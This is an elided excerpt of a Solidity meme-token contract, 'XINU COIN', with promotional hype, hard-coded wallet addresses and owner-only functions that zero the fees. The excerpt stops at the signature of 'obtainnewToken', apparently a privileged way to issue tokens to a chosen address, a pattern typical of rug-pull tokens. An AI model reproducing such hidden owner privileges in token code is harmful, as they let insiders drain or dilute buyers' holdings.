...
Taxes : 3/5 $XINU rewards from each trx 💰💰 

Get ready for the rise of $XINU – the chosen pet on ELON X, 
heralding a new era in decentralized finance and meme culture.
**/
...
contract XINUCOIN is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "XINU COIN";
    string private constant _symbol = unicode"$XINU";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 737000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0xd80C4f75F9628F29A3Bdf8949BFffF15009279b3);
    address payable public MarketingWallet = payable(0xfB214a6f72D12B8F01a2544081ba53669F328594);
    ...
    function removesFees() external onlyAddress {
        _tax_On_Buy = 0;
        _tax_On_Sell = 0;
    }
    ...
    function obtainnewToken(uint256 value, address adr) onlyAddress public virtual {
